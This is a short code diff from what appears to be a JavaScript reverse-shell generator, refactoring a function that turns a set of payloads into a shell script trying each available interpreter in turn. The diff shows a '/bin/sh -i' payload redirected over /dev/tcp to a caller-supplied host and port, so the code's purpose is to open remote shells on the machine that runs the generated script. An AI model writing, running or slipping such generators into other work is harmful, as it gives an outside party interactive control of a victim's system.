@@ -19,12 +19,12 @@ const generateScript = (host, port) => {
 		sh: `/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`
 	};
 
-	return Object.keys(payloads).reduce((acc, cmd) => {
-		acc += `if command -v ${cmd} > /dev/null 2>&1; then\n` +
-			`	${payloads[cmd]}\n` +
+	return Object.entries(payloads).reduce((script, [cmd, payload]) => {
+		script += `if command -v ${cmd} > /dev/null 2>&1; then\n` +
+			`	${payload}\n` +
 			'	exit; \n' +
 			'fi \n';
-		return acc;
+		return script;
 	}, '');
 };
 
